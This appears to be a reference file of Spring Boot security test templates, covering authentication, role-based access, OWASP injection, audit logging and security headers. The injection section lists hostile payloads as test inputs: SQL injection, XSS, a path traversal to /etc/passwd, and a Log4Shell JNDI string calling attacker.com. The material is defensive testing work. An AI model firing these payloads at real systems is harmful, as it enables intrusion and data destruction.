# Security test templates

> Reference doc for `security-test-writer`. Read at runtime when authoring
> the corresponding test class. Templates are skeletons — adapt the
> resource path, role names, and payloads to the project under test.

## Authentication flow

```java
@SpringBootTest
@AutoConfigureMockMvc
class AuthenticationFlowTest {

    @Autowired private MockMvc mockMvc;

    @Test
    void protectedEndpoint_withoutToken_returns401() throws Exception {
        mockMvc.perform(get("/v1/<resource>"))
            .andExpect(status().isUnauthorized());
    }

    @Test
    void protectedEndpoint_withExpiredToken_returns401() throws Exception {
        var expired = jwtFactory.expired();
        mockMvc.perform(get("/v1/<resource>").header("Authorization", "Bearer " + expired))
            .andExpect(status().isUnauthorized());
    }

    @Test
    void protectedEndpoint_withInvalidSignature_returns401() throws Exception {
        var tampered = jwtFactory.withTamperedSignature();
        mockMvc.perform(get("/v1/<resource>").header("Authorization", "Bearer " + tampered))
            .andExpect(status().isUnauthorized());
    }
}
```

## Authorisation matrix

For each role × each endpoint combination, verify the expected
allow/deny. Use `@ParameterizedTest` with a CSV source describing
the matrix:

```java
@ParameterizedTest
@CsvSource({
    "USER,    GET,  /v1/items,         200",
    "USER,    POST, /v1/items,         201",
    "USER,    POST, /v1/admin/users,   403",
    "ADMIN,   POST, /v1/admin/users,   201",
    "ANONYMOUS, GET, /v1/items,        401"
})
void roleEndpointMatrix(String role, String method, String path, int expectedStatus) {
    // ...
}
```

## OWASP A03 — Injection

For every endpoint that accepts string input, fire a battery of
injection payloads and verify the response is either 400 (validation
rejection) or 200 with sanitised output:

```java
@ParameterizedTest
@ValueSource(strings = {
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "<script>alert(1)</script>",
    "../../etc/passwd",
    "${jndi:ldap://attacker.com/x}",  // log4shell
})
void injectionPayloads_areSafelyHandled(String payload) throws Exception {
    mockMvc.perform(
            post("/v1/<resource>")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"name\":\"" + payload + "\"}"))
        .andExpect(status().isIn(400, 422));  // validation rejection
}
```

## OWASP A09 — Logging & monitoring

Verify that critical operations produce audit logs with correlation
IDs and that the log shape matches the JSON schema established by
Phase 4 hardening:

```java
@Test
void criticalOperation_emitsAuditLog() {
    var listAppender = attachListAppender(AuditLogger.class);

    service.deleteCustomer(customerId);

    var entries = listAppender.list;
    assertThat(entries).anyMatch(e ->
        e.getMessage().contains("customer.deleted") &&
        e.getMDCPropertyMap().containsKey("correlationId") &&
        e.getMDCPropertyMap().containsKey("userId"));
}
```

## Headers & CORS

```java
@Test
void responseHeaders_includeOwaspBaseline() throws Exception {
    mockMvc.perform(get("/v1/<resource>").header("Authorization", validToken()))
        .andExpect(header().string("X-Content-Type-Options", "nosniff"))
        .andExpect(header().string("X-Frame-Options", "DENY"))
        .andExpect(header().string("Strict-Transport-Security", containsString("max-age=")))
        .andExpect(header().exists("Content-Security-Policy"));
}

@Test
void cors_allowsOnlyConfiguredOrigins() throws Exception {
    mockMvc.perform(
            options("/v1/<resource>")
                .header("Origin", "https://evil.com")
                .header("Access-Control-Request-Method", "POST"))
        .andExpect(status().isForbidden());
}
```
